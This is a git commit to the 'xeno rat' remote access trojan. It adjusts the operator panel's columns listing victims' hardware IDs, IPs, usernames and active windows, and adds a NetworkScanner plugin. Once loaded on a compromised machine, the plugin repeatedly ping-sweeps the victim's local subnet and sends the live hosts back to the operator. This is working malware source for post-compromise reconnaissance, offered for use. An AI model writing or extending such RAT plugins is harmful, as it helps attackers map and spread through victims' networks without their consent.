7f2bf70f365a8d9a74765d130103a2e58fd524ab
slava <slava21190@protonmail.com>
2024-12-26 22:45:08 +0100

    adjust MainForm

--- xeno rat server/MainForm.Designer.cs
+++ xeno rat server/MainForm.Designer.cs
@@ -178,17 +178,17 @@ namespace xeno_rat_server
             // columnHeader3
             // 
             this.columnHeader3.Text = "Hwid";
-            this.columnHeader3.Width = 179;
+            this.columnHeader3.Width = 80;
             // 
             // columnHeader4
             // 
             this.columnHeader4.Text = "IP";
-            this.columnHeader4.Width = 129;
+            this.columnHeader4.Width = 102;
             // 
             // columnHeader5
             // 
             this.columnHeader5.Text = "Username";
-            this.columnHeader5.Width = 145;
+            this.columnHeader5.Width = 101;
             // 
             // columnHeader15
             // 
@@ -218,17 +218,17 @@ namespace xeno_rat_server
             // columnHeader9
             // 
             this.columnHeader9.Text = "Current Window";
-            this.columnHeader9.Width = 224;
+            this.columnHeader9.Width = 186;
             // 
             // columnHeader10
             // 
             this.columnHeader10.Text = "Ping";
-            this.columnHeader10.Width = 50;
+            this.columnHeader10.Width = 65;
             // 
             // columnHeader14
             // 
             this.columnHeader14.Text = "Idle Time";
-            this.columnHeader14.Width = 84;
+            this.columnHeader14.Width = 66;
             // 
             // tabPage1
             // 
---
+++ xeno rat server/NetworkScanner.cs
@@ -0,0 +1,90 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Plugin
+{
+    public class Main
+    {
+        private async Task<List<string>> ScanNetworkAsync()
+        {
+            List<string> activeDevices = new List<string>();
+            string localIP = GetLocalIPAddress();
+
+            if (string.IsNullOrEmpty(localIP))
+                return activeDevices;
+
+            string baseIP = localIP.Substring(0, localIP.LastIndexOf('.') + 1);
+
+            // Parallel scanning of the network
+            List<Task> tasks = new List<Task>();
+            for (int i = 1; i < 255; i++)
+            {
+                string ip = baseIP + i;
+                tasks.Add(Task.Run(() =>
+                {
+                    if (PingHost(ip))
+                        activeDevices.Add(ip);
+                }));
+            }
+
+            await Task.WhenAll(tasks);
+            return activeDevices;
+        }
+
+        private bool PingHost(string ip)
+        {
+            try
+            {
+                using (Ping ping = new Ping())
+                {
+                    PingReply reply = ping.Send(ip, 100); // Timeout 100ms
+                    return reply != null && reply.Status == IPStatus.Success;
+                }
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        private string GetLocalIPAddress()
+        {
+            foreach (var networkInterface in NetworkInterface.GetAllNetworkInterfaces())
+            {
+                if (networkInterface.OperationalStatus == OperationalStatus.Up &&
+                    networkInterface.NetworkInterfaceType != NetworkInterfaceType.Loopback)
+                {
+                    foreach (var address in networkInterface.GetIPProperties().UnicastAddresses)
+                    {
+                        if (address.Address.AddressFamily == AddressFamily.InterNetwork)
+                            return address.Address.ToString();
+                    }
+                }
+            }
+            return null;
+        }
+
+        public async Task Run(Node node)
+        {
+            while (node.Connected())
+            {
+                List<string> devices = await ScanNetworkAsync();
+                StringBuilder result = new StringBuilder();
+
+                foreach (var device in devices)
+                    result.AppendLine(device);
+
+                byte[] data = Encoding.UTF8.GetBytes(result.ToString());
+                await node.SendAsync(data);
+
+                await Task.Delay(5000); // Wait 5 seconds before rescanning
+            }
+        }
+    }
+}
